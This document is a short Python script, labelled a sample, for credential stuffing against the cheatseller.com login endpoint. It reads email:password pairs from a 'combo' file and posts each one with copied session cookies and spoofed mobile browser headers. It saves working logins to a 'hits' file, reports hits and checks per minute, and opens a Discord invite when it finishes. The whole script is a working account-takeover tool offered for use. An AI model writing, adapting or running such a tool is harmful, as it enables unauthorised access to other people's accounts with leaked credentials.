# This is a sample!
import requests
import time
import sys
import webbrowser

cookies = {
    '__ddg9_': '130.193.222.109',
    '__ddg1_': '5cnKDray3K3rHIwHtjkE',
    'PHPSESSID': '206c3c56dfdc585d1db8df8c80403e6b',
    '_ga': 'GA1.1.1003502151.1755162111',
    '_ym_uid': '1755162112572286522',
    '_ym_d': '1755162112',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
    '__ddg10_': '1755162233',
    '__ddg8_': 'xn7Lgm3RHNdExERy',
    '_ga_NV2PGVKQ8G': 'GS2.1.s1755162110$o1$g1$t1755162258$j59$l0$h0',
}

headers = {
    'authority': 'cheatseller.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://cheatseller.com',
    'referer': 'https://cheatseller.com/personal',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

combo_file = input("Use combo:")
hits_file = "cheatseller-hits.txt"    

hits = 0
bad = 0
start_time = time.time()

with open(combo_file, "r", encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if not line or ":" not in line:
            continue
        email, password = line.split(":", 1)
        data = f"email={email}&password={password}"

        try:
            response = requests.post(
                'https://cheatseller.com/auth/auth.php',
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=10
            )

            if 'passed' in response.text:
                hits += 1
                with open(hits_file, "a", encoding="utf-8") as hf:
                    hf.write(f"{email}:{password}\n")
            else:
                bad += 1

        except requests.RequestException:
            bad += 1


        elapsed = time.time() - start_time
        cpm = (hits + bad) / (elapsed / 60) if elapsed > 0 else 0


        sys.stdout.write(f"\rHits: {hits} | Bad: {bad} | CPM: {cpm:.2f}")
        sys.stdout.flush()
webbrowser.open('https://discord.gg/2RyM28f3EC')
print(f"\nFinished! Final Hits: {hits} | Final Bad: {bad} | Final CPM: {cpm:.2f}")
